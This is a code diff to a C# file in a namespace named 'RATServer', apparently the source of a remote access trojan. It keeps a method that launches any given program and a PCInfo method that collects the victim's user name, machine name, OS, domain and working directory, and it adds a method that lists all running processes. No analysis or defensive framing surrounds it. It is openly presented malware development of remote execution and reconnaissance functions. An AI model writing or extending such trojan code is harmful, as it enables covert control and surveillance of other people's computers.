@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -14,12 +15,18 @@ namespace RATServer
         }
         public static void Run(string Path)
         {
-            System.Diagnostics.Process.Start(Path);
+            Process.Start(Path);
         }
         public static string PCInfo()
         {
-            string x;
-            x = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
+            string x = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
+            return x;
+        }
+        public static string Processes()
+        {
+            string x = "";
+            foreach (Process p in Process.GetProcesses())
+                x += p.ProcessName + Environment.NewLine;
             return x;
         }
     }
